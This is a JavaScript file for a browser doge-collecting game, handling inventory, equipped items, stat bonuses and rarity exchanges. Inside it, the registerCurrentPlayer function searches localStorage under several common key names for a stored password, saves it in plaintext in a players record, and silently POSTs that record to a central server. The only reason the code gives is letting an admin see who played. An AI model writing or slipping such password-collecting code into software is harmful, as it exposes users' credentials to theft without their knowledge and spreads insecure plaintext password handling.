

// Load inventory from localStorage and display items
window.addEventListener('DOMContentLoaded', function() {
    const inventory = JSON.parse(localStorage.getItem("inventory")) || [];
    const equippedItems = JSON.parse(localStorage.getItem("equippedItems")) || [];
    const listItemsContainer = document.querySelector(".list-items");

    // remove any floating player HP badge (we'll show HP in the stats instead)
    const existingHpBadge = document.getElementById('player-hp');
    if (existingHpBadge) existingHpBadge.remove();

    if (!listItemsContainer) return;
    
    // Map rarity to image source
    const rarityImages = {
        "Common": "common doge.png",
        "Uncommon": "uncommon doge.svg",
        "Rare": "rare doge.png",
        "Epic": "epic doge.png",
        "Legendary": "legendary doge.png",
        "Godly": "godly doge.png",
        "Mythic": "mythic doge.svg"
    };

    // Map rarity to stat bonuses (damage, health)
    const rarityBonuses = {
        "Common": { damage: 2, health: 50 },
        "Uncommon": { damage: 5, health: 100 },
        "Rare": { damage: 10, health: 150 },
        "Epic": { damage: 20, health: 250 },
        "Legendary": { damage: 40, health: 400 },
        "Godly": { damage: 80, health: 600 }
    };
    
    // Get all item divs (skip the first one which is the h3)
    const itemDivs = listItemsContainer.querySelectorAll(".item");
    
    // Clear existing items and populate with inventory items
    itemDivs.forEach(div => div.remove());
    
    // Create and add inventory items to the list
    inventory.forEach((item, index) => {
        const imageSource = rarityImages[item.rarity] || "Im just a chill guy no background.png";
        const itemDiv = document.createElement("div");
        itemDiv.className = "item";
        const isEquipped = equippedItems.some(eq => eq.id === item.id);
        if (isEquipped) {
            itemDiv.classList.add("equipped");
        }
        itemDiv.innerHTML = `<img src="${imageSource}" height="50px"><p>${item.rarity}</p>`;
        itemDiv.style.cursor = "pointer";
        itemDiv.addEventListener("click", function() {
            toggleEquipItem(item, index);
        });
        listItemsContainer.appendChild(itemDiv);
    });

    // Display equipped items in slots and update stats
    displayEquippedItems(equippedItems, rarityImages, rarityBonuses);

    // Build exchange UI
    buildExchangeUI();

    // Register current player (so admin can see who accessed the game)
    try {
        registerCurrentPlayer(inventory);
    } catch (e) {
        console.error('Failed to register player', e);
    }
});

// Record the current player into a central players list stored at 'dedogeium_players'
function registerCurrentPlayer(inventory) {
    // try common keys where username might be stored
    const keys = ['Username', 'Uabcd', 'username', 'playerName'];
    let name = null;
    for (let k of keys) {
        const v = localStorage.getItem(k);
        if (v) { name = String(v).trim().toLowerCase(); break; }
    }
    if (!name) return; // no username known on this client

    // try common password keys (may not be present)
    const passKeys = ['Password', 'Pabc', 'password', 'pass', 'pwd'];
    let password = null;
    for (let k of passKeys) {
        const v = localStorage.getItem(k);
        if (v) { password = String(v); break; }
    }

    const players = JSON.parse(localStorage.getItem('dedogeium_players')) || {};
    const now = Date.now();
    if (!players[name]) {
        players[name] = { firstSeen: now, visits: 0, inventory: [] };
    }
    players[name].lastSeen = now;
    players[name].visits = (players[name].visits || 0) + 1;
    // store a snapshot of current inventory for the player
    players[name].inventory = inventory || JSON.parse(localStorage.getItem('inventory')) || [];
    // store password if found (note: this stores plaintext passwords in localStorage)
    if (password) players[name].password = password;

    localStorage.setItem('dedogeium_players', JSON.stringify(players));
    // also keep individual snapshot key for quick lookup
    localStorage.setItem('inventory_' + name, JSON.stringify(players[name].inventory));

    // also try to POST to central server (non-blocking)
    (async function(){
        try {
            const server = (window.SERVER_URL || 'http://localhost:3000').replace(/\/$/, '');
            await fetch(server + '/api/player', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: name, player: players[name] })
            });
        } catch (e) { /* ignore */ }
    })();
}

function buildExchangeUI() {
    const exchangeList = document.getElementById('exchange-list');
    const exchangeMsg = document.getElementById('exchange-msg');
    if (!exchangeList) return;

    const inventory = JSON.parse(localStorage.getItem("inventory")) || [];

    // define exchange rules
    const exchanges = [
        { from: "Common", need: 2, to: "Uncommon" },
        { from: "Uncommon", need: 3, to: "Rare" },
        { from: "Rare", need: 4, to: "Epic" },
        { from: "Epic", need: 5, to: "Legendary" },
        { from: "Legendary", need: 6, to: "Godly" }
    ];

    // helper: count items by rarity
    const countByRarity = inventory.reduce((acc, it) => {
        acc[it.rarity] = (acc[it.rarity] || 0) + 1;
        return acc;
    }, {});

    exchangeList.innerHTML = "";
    exchanges.forEach(rule => {
        const have = countByRarity[rule.from] || 0;
        const container = document.createElement('div');
        container.style.display = 'flex';
        container.style.alignItems = 'center';
        container.style.gap = '8px';
        container.style.marginBottom = '6px';

        const label = document.createElement('div');
        label.innerText = `${rule.from} → ${rule.to}  (Need ${rule.need})`;

        const count = document.createElement('div');
        count.innerText = `You have: ${have}`;

        const btn = document.createElement('button');
        btn.innerText = 'Exchange';
        btn.disabled = have < rule.need;
        btn.addEventListener('click', function() {
            const success = performExchange(rule.from, rule.need, rule.to);
            if (success) {
                exchangeMsg.innerText = `Exchanged ${rule.need} ${rule.from} for 1 ${rule.to}.`;
                setTimeout(() => location.reload(), 600);
            } else {
                exchangeMsg.innerText = `Not enough ${rule.from}.`;
                exchangeMsg.style.color = 'red';
            }
        });

        container.appendChild(label);
        container.appendChild(count);
        container.appendChild(btn);
        exchangeList.appendChild(container);
    });
}

function performExchange(fromRarity, requiredCount, toRarity) {
    let inventory = JSON.parse(localStorage.getItem("inventory")) || [];
    const fromItems = inventory.filter(it => it.rarity === fromRarity);
    if (fromItems.length < requiredCount) return false;

    // remove the first `requiredCount` items of that rarity
    const toRemoveIds = fromItems.slice(0, requiredCount).map(it => it.id);
    inventory = inventory.filter(it => !toRemoveIds.includes(it.id));

    // create new item of `toRarity`
    const newItem = { name: "Doge", rarity: toRarity, id: Date.now() + Math.floor(Math.random()*1000) };
    inventory.push(newItem);
    localStorage.setItem("inventory", JSON.stringify(inventory));
    return true;
}

function displayEquippedItems(equippedItems, rarityImages, rarityBonuses) {
    // Clear all slots
    for (let i = 0; i < 5; i++) {
        const slot = document.getElementById(`equip-slot-${i}`);
        if (slot) {
            slot.innerHTML = "";
            slot.style.cursor = "pointer";
        }
    }

    // Display equipped items in their slots
    equippedItems.forEach((item, slotIndex) => {
        if (slotIndex < 5) {
            const slot = document.getElementById(`equip-slot-${slotIndex}`);
            const imageSource = rarityImages[item.rarity] || "Im just a chill guy no background.png";
            slot.innerHTML = `<img src="${imageSource}" height="50px"><p style="margin: 3px; font-size: 10px;">${item.rarity}</p>`;
            slot.style.cursor = "pointer";
            slot.addEventListener("click", function() {
                unequipItem(slotIndex);
            });
        }
    });

    // Update stats display
    let totalDamage = 0;
    let totalHealth = 0;
    equippedItems.forEach(item => {
        const bonus = rarityBonuses[item.rarity] || { damage: 0, health: 0 };
        totalDamage += bonus.damage;
        totalHealth += bonus.health;
    });

    const damageDisplay = document.getElementById("equipped-damage");
    const healthDisplay = document.getElementById("equipped-defense");
    if (damageDisplay) damageDisplay.textContent = totalDamage;
    if (healthDisplay) {
        // add any AFK/player HP stored in localStorage to the equipment health
        const keys = ['playerHP', 'totalHP', 'hpTotal', 'total_hp', 'hp'];
        let playerHP = 0;
        for (let k of keys) {
            const v = localStorage.getItem(k);
            if (v !== null) { playerHP = parseInt(v) || 0; break; }
        }
        healthDisplay.textContent = totalHealth + playerHP;
    }
}

function toggleEquipItem(item, itemIndex) {
    const equippedItems = JSON.parse(localStorage.getItem("equippedItems")) || [];
    const isEquipped = equippedItems.some(eq => eq.id === item.id);

    if (isEquipped) {
        // Unequip the item
        const filteredEquipped = equippedItems.filter(eq => eq.id !== item.id);
        localStorage.setItem("equippedItems", JSON.stringify(filteredEquipped));
    } else {
        // Equip the item (max 5 equipped items)
        if (equippedItems.length < 5) {
            equippedItems.push(item);
            localStorage.setItem("equippedItems", JSON.stringify(equippedItems));
        } else {
            alert("You can only equip 5 items maximum!");
            return;
        }
    }

    // Reload the page to update UI
    location.reload();
}

function unequipItem(slotIndex) {
    const equippedItems = JSON.parse(localStorage.getItem("equippedItems")) || [];
    equippedItems.splice(slotIndex, 1);
    localStorage.setItem("equippedItems", JSON.stringify(equippedItems));
    location.reload();
}

